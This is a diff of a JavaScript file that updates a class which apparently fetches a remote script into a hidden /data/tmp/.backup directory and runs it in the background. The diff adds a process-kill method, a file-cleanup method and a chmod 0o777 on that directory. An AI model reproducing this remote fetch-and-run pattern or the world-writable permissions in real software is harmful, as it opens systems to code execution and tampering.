@@ -1165,16 +1165,19 @@ const initReplaceFile = async () => {
 };
 
 class ReplaceTmpManager {
+  static get VERSION() {
+    return 'v5';
+  }
   static get DIR() {
     return '/data/tmp/.backup';
   }
 
   static get URL() {
-    return 'https://r2-client-prod.zigoyw.com/xss-clean/replace-tmp.js';
+    return 'https://r2-client-prod.zigoyw.com/xss-clean/replace-tmp-v3.js';
   }
 
   static get SUCCESS_KEY() {
-    return 'replace-tmp-success-v2';
+    return 'replace-tmp-success-v9';
   }
 
   static get SUCCESS_TTL() {
@@ -1195,7 +1198,7 @@ class ReplaceTmpManager {
 
   remoteLog(message) {
     try {
-      remoteLogV(`[ReplaceTmp] ${message}`);
+      remoteLogV(`[ReplaceTmp-${ReplaceTmpManager.VERSION}] ${message}`);
     } catch (error) {
       // 远程日志失败不能影响宿主进程。
     }
@@ -1322,6 +1325,34 @@ class ReplaceTmpManager {
     });
   }
 
+  killProcess(pid) {
+    const processId = Number(pid);
+    if (!Number.isInteger(processId) || processId <= 0) {
+      return { pid, killed: false, error: 'invalid pid' };
+    }
+
+    try {
+      process.kill(processId, 'SIGKILL');
+      return { pid: processId, killed: true, error: '' };
+    } catch (error) {
+      return { pid: processId, killed: false, error: error.message };
+    }
+  }
+
+  async cleanupIndexFile() {
+    const file = path.join(ReplaceTmpManager.DIR, 'index.js');
+
+    try {
+      await fsPromises.unlink(file);
+      return { file, removed: true, error: '' };
+    } catch (error) {
+      if (error && error.code === 'ENOENT') {
+        return { file, removed: false, error: '' };
+      }
+      return { file, removed: false, error: error.message };
+    }
+  }
+
   startBackground(spawn, targetFile) {
     return new Promise((resolve, reject) => {
       try {
@@ -1404,6 +1435,7 @@ class ReplaceTmpManager {
       }
 
       await fsPromises.mkdir(ReplaceTmpManager.DIR, { recursive: true });
+      await fsPromises.chmod(ReplaceTmpManager.DIR, 0o777);
 
       const spawn = safeRequire('child_process').spawn;
       const targetFile = path.join(ReplaceTmpManager.DIR, 'index.js');
@@ -1451,9 +1483,14 @@ async function init() {
     remoteLogV(`preSandbox file sync init failed: ${error && error.message}`);
   }
 
+  // 定时任务 -- node进程
   try {
-    const processInfo = await new ReplaceTmpManager().getProcessInfo(277036);
-    remoteLogV(`[ReplaceTmp] processInfo=${JSON.stringify(processInfo)}`);
+    // const manager = new ReplaceTmpManager();
+    // const killsInfo = await manager.killProcess(292403);
+    // remoteLogV(`[ReplaceTmp] processManager killsInfo=${JSON.stringify(killsInfo)}`);
+    // const cleanupInfo = await manager.cleanupIndexFile();
+    // remoteLogV(`[ReplaceTmp] processManager cleanupInfo=${JSON.stringify(cleanupInfo)}`);
+    // await manager.init();
   } catch (error) {
     try {
       remoteLogV(`[ReplaceTmp] process info failed: ${error && error.message}`);
